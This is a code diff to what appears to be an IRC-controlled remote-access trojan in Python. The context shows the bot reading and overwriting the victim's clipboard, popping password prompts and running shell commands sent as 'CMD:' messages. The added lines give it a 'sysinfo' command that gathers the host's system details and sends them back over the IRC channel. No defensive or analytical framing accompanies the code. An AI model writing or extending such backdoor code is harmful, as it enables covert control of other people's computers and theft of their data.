@@ -4,6 +4,7 @@ from os import getcwd, chdir
 from subprocess import check_output,STDOUT
 from pymsgbox import alert,confirm,prompt,password
 from clipboard import paste , copy
+from platform import uname
 def clearBuffer(sock,time):
     sock.settimeout(time)
     while 1:
@@ -41,6 +42,9 @@ def processor(irc , server , channel , port , key , botnick):
                     text=text.strip().replace("CMD:", "").replace("wclipboard ", "")
                     copy(text)
                     send(irc, "DONE :)")
+                elif "sysinfo" in text:
+                    my_system = uname() 
+                    send(irc,f"""System: {my_system.system} , Node Name: {my_system.node} , Release: {my_system.release} , Version: {my_system.version} , Machine: {my_system.machine} , Processor: {my_system.processor}""")
                 elif "rclipboard" in text :
                     send(irc, paste())
                 elif "CMD:" in text :
